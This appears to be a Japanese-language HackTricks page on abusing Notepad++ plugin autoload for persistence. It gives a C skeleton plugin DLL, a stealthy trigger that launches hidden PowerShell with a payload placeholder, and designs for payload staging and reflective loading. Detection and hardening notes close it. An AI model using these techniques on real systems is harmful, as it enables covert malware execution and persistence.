# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ は起動時に、`plugins` サブフォルダ内で見つかったすべての plugin DLL を **autoload** する。任意の**書き込み可能な Notepad++ インストール先**に malicious plugin を置くと、エディタ起動のたびに `notepad++.exe` 内で code execution を得られ、**persistence**、目立たない**initial execution**、またはエディタが昇格して起動された場合の **in-process loader** として悪用できる。

**Notepad++ 7.6+** では、手動インストール時の想定レイアウトは plugin ごとに **1つのサブフォルダ** となる（`plugins\<PluginName>\<PluginName>.dll`）。**portable mode**（`notepad++.exe` の隣に `doLocalConf.xml` が存在する場合）では、アプリケーション全体のツリーがそのディレクトリ内にローカルに保持されるため、コピーされた admin tool bundle がユーザー書き込み可能な実行面になりやすい。

## Writable plugin locations
- 標準インストール: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常は書き込みに admin 権限が必要）。
- 権限の低い operator 向けの書き込み可能な選択肢:
- ユーザー書き込み可能なフォルダで **portable Notepad++ build** を使う。
- `C:\Program Files\Notepad++` をユーザー管理のパス（例: `%LOCALAPPDATA%\npp\`）にコピーし、そこから `notepad++.exe` を実行する。
- すでに `doLocalConf.xml` を含み、`Program Files` の外で動作している **admin tool bundles**、展開済み zip コピー、または help-desk toolkits を探す。
- 各 plugin は `plugins` 配下に専用のサブフォルダを持ち、起動時に自動的に読み込まれる。メニュー項目は **Plugins** の下に表示される。

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ は、特定の **exported functions** を期待します。これらはすべて初期化中に呼び出され、複数の execution surface を与えます:
- **`DllMain`** — DLL load 時に即座に実行される（最初の execution point）。
- **`setInfo(NppData)`** — load 時に 1 回呼ばれ、Notepad++ の handle を渡す。通常は menu items を登録する場所。
- **`getName()`** — menu に表示される plugin 名を返す。
- **`getFuncsArray(int *nbF)`** — menu commands を返す。空でも startup 中に呼ばれる。
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events を受け取る（ユーザー操作や editor event まで payload を遅らせるのに有用）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler。より大きな data exchanges に有用。
- **`isUnicode()`** — load 時にチェックされる compatibility flag。

ほとんどの exports は **stubs** として実装できる; execution は autoload 中に `DllMain` または上記の任意の callback から開始できる。

## Minimal malicious plugin skeleton
期待される exports を持つ DLL をコンパイルし、書き込み可能な Notepad++ フォルダ配下の `plugins\\MyNewPlugin\\MyNewPlugin.dll` に配置する:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL をビルドする (Visual Studio/MinGW)。
2. `plugins` の下に plugin 用のサブフォルダを作成し、その中に DLL を配置する。
3. Notepad++ を再起動する; DLL は自動的にロードされ、`DllMain` とその後の callbacks が実行される。

## `beNotified` を使った low-noise trigger pattern
For OPSEC, 多くの payload は `DllMain` から **発火させるべきではない**。より静かな pattern は、plugin をきれいに load させた後、**startup complete**、**buffer activation**、または **最初に入力された文字** のような現実的な editor event の後にのみ execute すること。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
これは noisy な `DllMain` beacon よりも public offensive research に適しています: DLL は起動時に引き続き autoload されますが、malicious action は Notepad++ が実際に使用されているように見えてから遅延されます。

## plugin config directory を secondary storage として使用する
Notepad++ は `NPPM_GETPLUGINSCONFIGDIR` を公開しており、これは **current user's plugin configuration directory** を返します。malicious plugin はこれを使って、on-disk の DLL を最小限に保ちながら、encrypted config、staged payloads、または tasking files を通常の plugin state に紛れ込む path に保存できます。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
運用上、これは次のような場合に有用です:
- 小さな autoload される bootstrap DLL が欲しいとき;
- メインの plugin binary を再度触らずに per-user tasking を行いたいとき;
- **autoload trigger** をより重い second stage から分離したいとき。

## Reflective loader plugin pattern
武器化された plugin は Notepad++ を **reflective DLL loader** に変えられます:
- 最小限の UI/menu entry (例: "LoadDLL") を用意する。
- payload DLL を取得するための **file path** または **URL** を受け付ける。
- DLL を現在の process に reflectively map し、export された entry point (例: 取得した DLL 内の loader function) を呼び出す。
- 利点: 新しい loader を起動する代わりに、見た目が benign な GUI process を再利用できる; payload は `notepad++.exe` の integrity を継承する (elevated contexts を含む)。
- トレードオフ: **unsigned plugin DLL** を disk に drop するのは目立つ; 実用的な変形としては、autoload される plugin を stub として使い、本物の implant は別の場所で encrypted/staged にしておく。

## Detection and hardening notes
- Notepad++ の plugin directories への **writes** を block または monitor する (user profiles 内の portable copies も含む); controlled folder access か application allowlisting を有効にする。
- `plugins` 配下の **new unsigned DLLs**、portable Notepad++ tree への変更、そして `notepad++.exe` からの異常な **child processes/network activity** を alert する。
- 正規の plugins を baseline 化し、通常の Notepad++ plugin interface を export しつつ shell, PowerShell, または network beacons も起動する新しい DLL がないか調査する。
- plugin installation は **Plugins Admin** 経由のみに強制し、信頼できない path からの portable copy の実行を制限する。

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
